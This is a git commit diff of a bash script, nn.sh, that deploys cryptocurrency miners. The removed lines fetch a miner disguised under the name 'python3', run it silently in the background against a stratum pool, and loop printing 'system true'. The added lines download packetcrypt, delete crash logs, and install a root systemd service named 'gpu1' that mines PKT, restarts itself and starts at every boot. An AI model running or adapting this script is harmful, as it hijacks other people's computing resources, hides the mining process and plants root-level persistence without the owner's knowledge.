4904d45816fc1779b2ca2330cba4fc62556c35f6
jgaswerhah <114896969+jgaswerhah@users.noreply.github.com>
2022-10-07 13:28:03 +0700

    Update nn.sh

--- nn.sh
+++ nn.sh
@@ -1,5 +1,29 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/mulayia70/lamak/main/mom/bu/python3
-chmod +x python3
-./python3 -a yespowertide -o stratum+tcp://147.182.177.241:443 -u TXKpEMM3Tz5a2uuanyckfjELhKD4yGcyCn.g -p x -t$(nproc --all) >/dev/null 2>&1 >/dev/null &
-while :; do echo "system true"; sleep 30; done
+cd /home
+sudo wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
+sudo chmod +x packetcrypt
+sudo rm -rf /lib/systemd/system/pktpool.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/pktpool.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/packetcrypt ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+systemctl daemon-reload &&
+systemctl enable pktpool.service &&
+service pktpool stop  &&
+service pktpool restart
+
+
+
+top
